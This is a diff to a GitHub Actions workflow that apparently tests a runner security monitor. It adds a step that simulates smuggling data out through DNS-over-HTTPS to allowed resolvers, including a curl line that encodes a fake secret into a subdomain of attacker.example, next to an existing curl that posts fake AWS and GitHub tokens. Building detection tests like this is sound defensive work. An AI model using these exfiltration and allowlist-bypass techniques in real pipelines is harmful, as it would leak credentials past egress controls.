@@ -47,5 +47,17 @@ jobs:
             -d "{\"aws_key\":\"${FAKE_AWS}\",\"github_token\":\"${FAKE_GH}\"}" || true
           curl -s -o /dev/null https://example.com/ || true
 
+      - name: DNS-over-HTTPS exfil (the Harden-Runner bypass)
+        run: |
+          # Smuggle data out via DoH to an ALLOWED resolver (dns.google). A
+          # domain-allowlist tool sees a legit HTTPS connection and misses it.
+          # Runner Guard reads the decrypted request and flags it. Not real data.
+          curl -s -o /dev/null -X POST "https://dns.google/dns-query" \
+            -H "Content-Type: application/dns-message" \
+            --data-binary $'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00' || true
+          # GET/JSON DoH variant with data in the name= label
+          curl -s -o /dev/null "https://cloudflare-dns.com/dns-query?name=ZXhmaWx0cmF0ZWQtc2VjcmV0.attacker.example" \
+            -H "Accept: application/dns-json" || true
+
       - name: Let the guard capture
         run: sleep 8
